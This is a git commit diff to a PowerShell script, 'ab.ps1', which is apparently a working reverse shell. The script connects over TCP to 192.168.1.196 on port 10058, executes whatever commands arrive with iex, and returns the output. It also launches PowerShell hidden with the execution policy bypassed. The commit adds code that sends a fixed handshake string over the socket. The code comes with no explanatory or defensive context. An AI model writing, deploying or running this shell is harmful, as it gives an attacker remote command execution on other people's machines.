0a2acc0bbfdb8918c35a9be38af06290c6c3a626
somuta <72095504+somuta@users.noreply.github.com>
2023-08-19 19:24:19 +0300

    Update ab.ps1

--- ab.ps1
+++ ab.ps1
@@ -2,6 +2,12 @@ $client = New-Object System.Net.Sockets.TCPClient('192.168.1.196', 10058)
 $stream = $client.GetStream()
 [byte[]]$bytes = 0..65535 | ForEach-Object { 0 }
   Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command $data" -Wait -NoNewWindow
+
+  $sendbyte = ([Text.Encoding]::ASCII).GetBytes("05040303")
+    $stream.Write($sendbyte, 0, $sendbyte.Length)
+    $stream.Flush()
+
+    
 while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
     $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
     $sendback = (iex ". { $data } 2>&1" | Out-String)
